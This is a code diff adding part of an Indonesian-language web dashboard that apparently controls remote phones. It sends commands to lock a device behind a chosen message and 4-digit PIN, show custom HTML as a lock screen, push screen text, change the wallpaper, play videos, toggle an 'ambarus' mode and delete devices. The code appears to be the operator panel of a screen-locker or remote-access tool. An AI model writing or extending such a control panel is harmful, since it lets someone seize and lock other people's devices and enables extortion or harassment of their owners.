+            </div>
+
+            <div class="feature-row">
+              <div class="feature-row-icon amber">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.59 11a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.5 0h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9a16 16 0 0 0 6.29 6.29l1.42-1.42a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+              </div>
+              <div class="feature-row-text">
+                <div class="feature-row-title">Ambarus</div>
+                <div class="feature-row-desc">Aktifkan mode ambarus pada device</div>
+              </div>
+              <label class="toggle-wrap">
+                <input type="checkbox" id="toggle-ambarus" ${f.ambarus ? 'checked' : ''} onchange="handleToggle(this, 'ambarus', 'ambarus_off')" />
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+
+            <div class="feature-row">
+              <div class="feature-row-icon blue">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+              </div>
+              <div class="feature-row-text">
+                <div class="feature-row-title">Lock HTML</div>
+                <div class="feature-row-desc">Tampilkan kode HTML sebagai lock screen</div>
+              </div>
+              <label class="toggle-wrap">
+                <input type="checkbox" id="toggle-lockhtml" ${f.lockHtml ? 'checked' : ''} onchange="handleLockHtmlToggle(this)" />
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+
+          </div>
+
+          <div style="margin-top:16px;">
+            <div class="section-label" style="margin-bottom:12px;">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+              Upload Media
+            </div>
+            <div class="upload-row" style="margin-bottom:10px;">
+              <div class="feature-row-icon blue" style="border-radius:9px;width:36px;height:36px;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+              </div>
+              <div class="feature-row-text">
+                <div class="feature-row-title">Ubah Wallpaper</div>
+                <div class="feature-row-desc">Upload gambar sebagai wallpaper device</div>
+              </div>
+              <button class="upload-btn" onclick="document.getElementById('wallpaperFileInput').click()">Upload</button>
+            </div>
+            <div class="upload-row">
+              <div class="feature-row-icon red" style="border-radius:9px;width:36px;height:36px;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg>
+              </div>
+              <div class="feature-row-text">
+                <div class="feature-row-title">Putar Video</div>
+                <div class="feature-row-desc">Upload video untuk diputar di device</div>
+              </div>
+              <button class="upload-btn" onclick="document.getElementById('videoFileInput').click()">Upload</button>
+            </div>
+          </div>
+
+          <div style="margin-top:16px;">
+            <button class="delete-device-btn" style="width:100%;" onclick="deleteDevice('${device.id}')">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>
+              Hapus Device
+            </button>
+          </div>
+
+        </div>
+      </div>
+    `
+  }
+
+  function goBackToList() {
+    if (refreshInterval) { clearInterval(refreshInterval); refreshInterval = null }
+    selectedDevice = null
+    renderDeviceList()
+    loadDevices()
+  }
+
+  async function handleToggle(el, actionOn, actionOff, needsInput, needsTeks) {
+    const checked = el.checked
+    if (checked && actionOn === 'lock') {
+      el.checked = false
+      pendingDeviceId = selectedDevice.id
+      openInputSheet('lockOverlay')
+      return
+    }
+    if (checked && needsTeks) {
+      el.checked = false
+      pendingDeviceId = selectedDevice.id
+      openInputSheet('teksLayarOverlay')
+      return
+    }
+    const action = checked ? actionOn : actionOff
+    await sendAction(selectedDevice.id, { action })
+  }
+
+  function handleLockHtmlToggle(el) {
+    if (el.checked) {
+      el.checked = false
+      pendingDeviceId = selectedDevice.id
+      openInputSheet('lockHtmlOverlay')
+    } else {
+      sendAction(selectedDevice.id, { action: 'unlockhtml' })
+    }
+  }
+
+  async function submitLock() {
+    const lockText = document.getElementById('lockTextInput').value.trim()
+    const lockPin = document.getElementById('lockPinInput').value.trim()
+    if (!lockText) { showNotif('error', 'Gagal', 'Pesan lock tidak boleh kosong.'); return }
+    if (!/^\d{4}$/.test(lockPin)) { showNotif('error', 'Gagal', 'PIN harus 4 angka.'); return }
+    closeInputSheet('lockOverlay')
+    await sendAction(pendingDeviceId, { action: 'lock', lockText, lockPin })
+    document.getElementById('lockTextInput').value = ''
+    document.getElementById('lockPinInput').value = ''
+  }
+
+  async function submitTeksLayar() {
+    const teks = document.getElementById('teksLayarInput').value.trim()
+    if (!teks) { showNotif('error', 'Gagal', 'Teks tidak boleh kosong.'); return }
+    closeInputSheet('teksLayarOverlay')
+    await sendAction(pendingDeviceId, { action: 'tekslayar', teksLayar: teks })
+    document.getElementById('teksLayarInput').value = ''
+  }
+
+  async function submitLockHtml() {
+    const html = document.getElementById('lockHtmlInput').value.trim()
+    if (!html) { showNotif('error', 'Gagal', 'Kode HTML tidak boleh kosong.'); return }
+    closeInputSheet('lockHtmlOverlay')
+    await sendAction(pendingDeviceId, { action: 'lockhtml', lockHtml: html })
+    document.getElementById('lockHtmlInput').value = ''
+    const toggle = document.getElementById('toggle-lockhtml')
+    if (toggle) toggle.checked = true
+  }
+
+  async function sendAction(deviceId, body) {
+    try {
+      const r = await fetch(`${BASE}/api/device/action`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'x-token': token },
+        body: JSON.stringify({ deviceId, ...body })
+      })
+      const d = await r.json()
+      if (d.success) {
+        showNotif('success', 'Berhasil', d.message || 'Aksi berhasil dikirim ke device.')
+      } else {
+        showNotif('error', 'Gagal', d.error || 'Gagal mengirim aksi.')
+      }
+    } catch {
+      showNotif('error', 'Error', 'Gagal terhubung ke server.')
+    }
+  }
+
+  async function handleVideoUpload(input) {
+    if (!input.files[0]) return
+    if (!selectedDevice) return
+    const file = input.files[0]
+    const formData = new FormData()
+    formData.append('video', file)
+    formData.append('deviceId', selectedDevice.id)
+    try {
+      const r = await fetch(`${BASE}/api/device/action/putarvideo`, {
+        method: 'POST',
+        headers: { 'x-token': token },
+        body: formData
+      })
+      const d = await r.json()
+      if (d.success) {
+        showNotif('success', 'Berhasil', d.message || 'Video berhasil dikirim.')
+      } else {
+        showNotif('error', 'Gagal', d.error || 'Gagal mengirim video.')
+      }
+    } catch {
+      showNotif('error', 'Error', 'Gagal upload video.')
+    }
+    input.value = ''
+  }
+
+  async function handleWallpaperUpload(input) {
+    if (!input.files[0]) return
+    if (!selectedDevice) return
+    const file = input.files[0]
+    const formData = new FormData()
+    formData.append('wallpaper', file)
+    formData.append('deviceId', selectedDevice.id)
+    try {
+      const r = await fetch(`${BASE}/api/device/action/wallpaper`, {
+        method: 'POST',
+        headers: { 'x-token': token },
+        body: formData
+      })
+      const d = await r.json()
+      if (d.success) {
+        showNotif('success', 'Berhasil', d.message || 'Wallpaper berhasil dikirim.')
+      } else {
+        showNotif('error', 'Gagal', d.error || 'Gagal mengirim wallpaper.')
+      }
+    } catch {
+      showNotif('error', 'Error', 'Gagal upload wallpaper.')
+    }
+    input.value = ''
+  }
+
+  async function deleteDevice(id) {
+    if (!confirm('Yakin ingin hapus device ini?')) return
+    try {
+      const r = await fetch(`${BASE}/api/devices/${id}`, {
+        method: 'DELETE',
+        headers: { 'x-token': token }
+      })
+      const d = await r.json()
+      if (d.success) {
+        showNotif('success', 'Dihapus', 'Device berhasil dihapus.')
+        setTimeout(() => { closeNotif(); goBackToList() }, 1500)
+      } else {
+        showNotif('error', 'Gagal', d.error || 'Gagal hapus device.')
+      }
+    } catch {
+      showNotif('error', 'Error', 'Gagal terhubung ke server.')
+    }
+  }
+
+  function openInputSheet(id) {
+    document.getElementById(id).classList.add('show')
+  }
+
+  function closeInputSheet(id) {
+    document.getElementById(id).classList.remove('show')
+  }
+
+  function showNotif(type, title, message) {
+    const overlay = document.getElementById('notifOverlay')
+    const icon = document.getElementById('notifIcon')
+    const titleEl = document.getElementById('notifTitle')
+    const msgEl = document.getElementById('notifMessage')
+    const btn = document.getElementById('notifBtn')
+
+    const icons = {
+      success: `<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>`,
+      error: `<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>`,
+      info: `<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>`
+    }
+
+    icon.className = `notif-icon-wrap ${type}`
+    icon.innerHTML = icons[type] || icons.info
+    titleEl.textContent = title
+    msgEl.textContent = message
+    btn.className = `notif-btn ${type}`
+    overlay.classList.add('show')
+  }
+
+  function closeNotif() {
+    document.getElementById('notifOverlay').classList.remove('show')
+  }
+
+  function escHtml(str) {
+    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')
+  }
+
+  init()
+</script>
+</body>
+</html>
